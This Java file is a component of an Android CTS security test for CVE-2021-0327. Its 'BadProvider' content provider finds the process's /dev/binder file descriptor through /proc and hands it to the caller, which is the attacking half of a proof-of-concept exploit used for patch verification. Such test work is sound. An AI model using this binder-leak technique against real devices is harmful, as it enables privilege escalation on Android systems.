package android.security.cts.CVE_2021_0327;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.Process;
import android.os.RemoteException;
import android.system.ErrnoException;
import android.system.Os;

import java.io.IOException;

public class BadProvider extends ContentProvider {
    @Override
    public boolean onCreate() {
        return true;
    }

    @Override
    public Bundle call(String method, String arg, Bundle extras) {
        if ("get_aidl".equals(method)) {
            Bundle bundle = new Bundle();
            bundle.putBinder("a", new IBadProvider.Stub() {
                @Override
                public ParcelFileDescriptor takeBinder() throws RemoteException {
                    for (int i = 0; i < 100; i++) {
                        try {
                            String name = Os.readlink("/proc/" + Process.myPid() + "/fd/" + i);
                            // Log.v("TAKEBINDER", "fd=" + i + " path=" + name);
                            if (name.startsWith("/dev/") && name.endsWith("/binder")) {
                                return ParcelFileDescriptor.fromFd(i);
                            }
                        } catch (ErrnoException | IOException e) {
                        }
                    }
                    return null;
                }

                @Override
                public void exit() throws RemoteException {
                    System.exit(0);
                }
            });
            return bundle;
        }
        return super.call(method, arg, extras);
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        return null;
    }

    @Override
    public String getType(Uri uri) {
        return null;
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        return null;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        return 0;
    }
}
